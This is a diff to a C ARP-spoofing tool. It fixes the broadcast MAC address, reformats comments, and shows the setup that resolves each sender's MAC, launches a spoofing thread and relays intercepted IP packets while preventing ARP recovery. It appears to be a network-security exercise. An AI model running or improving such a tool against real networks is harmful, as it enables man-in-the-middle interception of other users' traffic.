@@ -14,6 +14,7 @@ int main(int argc, char* argv[]) {
     usage();
     return -1;
   }
+
   cnt = (argc - 2) / 2;
   for(int i = 0; i < cnt; i++) {
     //parse ip from argv
@@ -52,10 +53,10 @@ int main(int argc, char* argv[]) {
   }
   
   uint8_t broadcast[6];
-  memcpy(broadcast, "\xff", 6);
+  memcpy(broadcast, "\xff\xff\xff\xff\xff\xff", 6);
 
-  for(int i = 0; i < cnt ; i++) {
-  //get sender mac
+  for(int i = 0; i < cnt; i++) {
+    //get sender mac
     send_arp(handle, REQUEST, attacker_ip, sender_ip[i], attacker_mac, broadcast);
     get_mac_by_ip(handle, sender_ip[i], sender_mac[i]);
     printf("%d. sender mac address: ", i+1);
@@ -77,7 +78,7 @@ int main(int argc, char* argv[]) {
   pthread_t thread;
   pthread_create(&thread, NULL, arp_spoofing_cycle, NULL);;
 
-  //relay and prevent arp recovery
+  //relay ip packet and prevent arp recovery
   while(true) {
     struct pcap_pkthdr* header;
     const u_char* packet;
